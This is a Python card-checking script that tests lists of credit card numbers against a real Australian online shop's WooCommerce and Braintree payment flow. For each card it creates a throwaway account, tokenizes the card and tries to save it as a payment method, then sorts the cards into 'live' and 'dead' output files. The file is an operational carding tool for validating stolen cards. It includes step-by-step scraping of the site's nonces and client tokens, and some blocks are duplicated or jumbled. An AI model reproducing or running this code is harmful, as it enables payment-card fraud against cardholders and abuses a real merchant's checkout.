import requests
import random
import string
import re
import base64
import json
from datetime import datetime
import time
from bs4 import BeautifulSoup

G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
W = "\033[97m"

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def check_card(cc, month, year, cvv):
    s = requests.session()

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flagworld.com.au',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    response = s.post('https://www.flagworld.com.au/my-account/', headers=headers)
    reg = re.search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', response.text).group(1)

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flagworld.com.au',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'email': generate_random_email(),
        'billing_phone': '15068596852',
        'billing_company': 'waysss',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-04-22 19:14:02',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': reg,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }

    response = s.post('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers, data=data)

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    response = s.get('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers)
    client = re.search(r'"client_token_nonce":"([^"]+)"', response.text).group(1)
    addn = re.search('id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', response.text).group(1)

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.flagworld.com.au',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }

    response = s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
    encoded_data = response.json()['data']
    decoded_bytes = base64.b64decode(encoded_data)
    decoded_str = decoded_bytes.decode('utf-8')
    json_data = json.loads(decoded_str)
    auth = json_data.get('authorizationFingerprint')

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '75e33920-44f7-4d60-955b-53092d4f34fe',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = s.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token = response.json()['data']['tokenizeCreditCard']['token']

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flagworld.com.au',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-04-22 19:14:02',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': reg,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }

    response = s.post('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers, data=data)

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    response = s.get('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers)
    client = re.search(r'"client_token_nonce":"([^"]+)"', response.text).group(1)
    addn = re.search('id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', response.text).group(1)

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.flagworld.com.au',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }

    response = s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
    encoded_data = response.json()['data']
    decoded_bytes = base64.b64decode(encoded_data)
    decoded_str = decoded_bytes.decode('utf-8')
    json_data = json.loads(decoded_str)
    auth = json_data.get('authorizationFingerprint')

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '75e33920-44f7-4d60-955b-53092d4f34fe',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = s.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token = response.json()['data']['tokenizeCreditCard']['token']

    headers = {
        'authority': 'www.flagworld.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.flagworld.com.au',
        'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': addn,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = s.post('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers, data=data)

    soup = BeautifulSoup(response.text, 'html.parser')

    error_message = None

    div = soup.find('div', class_='message-container')
    if div:
        error_message = div.get_text(strip=True)

    if not error_message:
        span = soup.find('span', class_='message-icon')
        if span:
            error_message = span.next_sibling.strip() if span.next_sibling else None

    if not error_message:
        ul = soup.find('ul', class_='woocommerce-error')
        if ul:
            error_message = ul.get_text(strip=True)

    if not error_message:
        success = soup.find('div', class_='woocommerce-message')
        if success:
            error_message = success.get_text(strip=True)

    return error_message

def main():
    
    file_path = input(f"{G}[+] Enter the path to your CC list file: {W}").strip()

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"{R}[!] File not found: {file_path}{W}")
        return
    except Exception as e:
        print(f"{R}[!] Error reading file: {e}{W}")
        return

    total = len(lines)
    live_count = 0
    dead_count = 0

    for i, line in enumerate(lines, 1):
        line = line.strip()
        if not line or line.startswith('#'):
            continue

        parts = line.split('|')
        if len(parts) != 4:
            print(f"{R}[!] Invalid format (expected CC|MM|YYYY|CVV): {line}{W}")
            continue

        cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()


        try:
            result = check_card(cc, month, year, cvv)

            if result and ('added' in result.lower() or 'success' in result.lower() or 'payment method' in result.lower()):
                print(f"{G}[LIVE] {cc}|{month}|{year}|{cvv} -> {result}{W}")
                live_count += 1
                with open('live.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{cc}|{month}|{year}|{cvv} -> {result}\n")
            else:
                if result:
                    print(f"{R}[DEAD] {cc}|{month}|{year}|{cvv} -> {result}{W}")
                else:
                    print(f"{G}[LIVE] {cc}|{month}|{year}|{cvv} -> No error message found (Possible Live){W}")
                    live_count += 1
                    with open('live.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{cc}|{month}|{year}|{cvv} -> No error message (Possible Live)\n")
                dead_count += 1
                with open('dead.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{cc}|{month}|{year}|{cvv} -> {result}\n")

        except Exception as e:
            print(f"{R}[ERROR] {cc}|{month}|{year}|{cvv} -> {str(e)}{W}")
            with open('error.txt', 'a', encoding='utf-8') as f:
                f.write(f"{cc}|{month}|{year}|{cvv} -> {str(e)}\n")

        time.sleep(1)

   

if __name__ == "__main__":
    main()
